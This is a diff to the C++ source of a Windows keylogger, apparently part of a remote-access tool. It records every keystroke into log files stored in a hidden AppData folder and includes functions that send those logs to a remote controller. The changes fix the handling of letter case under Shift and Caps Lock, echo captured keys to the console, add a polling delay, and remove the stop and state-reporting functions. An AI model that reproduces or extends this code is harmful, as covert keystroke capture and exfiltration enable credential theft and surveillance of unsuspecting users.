@@ -62,9 +62,12 @@ void KeyLogger::start() {
                             shift ? writeCharIntoLogFile(")") : writeCharIntoLogFile("9");
                             break;
                         case 65 ... 90:    // Alphabet
-                            (shift && !cap || !shift && cap) ?
-                            writeCharIntoLogFile((char) (i)) :
-                            writeCharIntoLogFile((char) (i + 32));
+                            if (shift == cap) {
+                                writeCharIntoLogFile((char) (i + 32));  // Minúscula
+                            }
+                            else {
+                                writeCharIntoLogFile((char) (i));  // Mayúscula
+                            }
                             break;
                         case 186:
                             if (shift) writeCharIntoLogFile("^");
@@ -107,6 +110,7 @@ void KeyLogger::start() {
                 }
             }
         }
+        Sleep(10);
     }
 }
 
@@ -120,6 +124,7 @@ bool KeyLogger::checkAltGr() {
 }
 
 void KeyLogger::writeCharIntoLogFile(const char *string) {
+    std::cout << string;
     if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
     std::ofstream fileStream;
     fileStream.open(logsFileName.c_str(), std::fstream::app);
@@ -132,6 +137,7 @@ void KeyLogger::writeCharIntoLogFile(const char *string) {
 }
 
 void KeyLogger::writeCharIntoLogFile(char string) {
+    std::cout << string;
     if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
     std::ofstream fileStream;
     fileStream.open(logsFileName.c_str(), std::fstream::app);
@@ -191,7 +197,7 @@ void KeyLogger::sendLastKeyloggerLog() {
     }
 }
 
-void KeyLogger::sendAll() const {
+void KeyLogger::sendAll() {
     if (logsExists()) {
         stream.sendSize(1);
         for (const auto &entry: std::filesystem::directory_iterator(pathOfLogs)) {
@@ -205,18 +211,10 @@ void KeyLogger::sendAll() const {
     }
 }
 
-void KeyLogger::sendState() const {
-    stream.sendSize(recordingKeys);
-}
-
-
-void KeyLogger::stopKeylogger(){
-    recordingKeys = false;
-}
 
 KeyLogger::KeyLogger(const Stream & stream) : Sender(stream) {
-#ifdef KEYLOGGER
-    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER) + L"\\";
+#ifdef KEYLOGGER_DEF
+    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER_DEF) + L"\\";
     logsFileName = generateLogName();
 #endif
 }
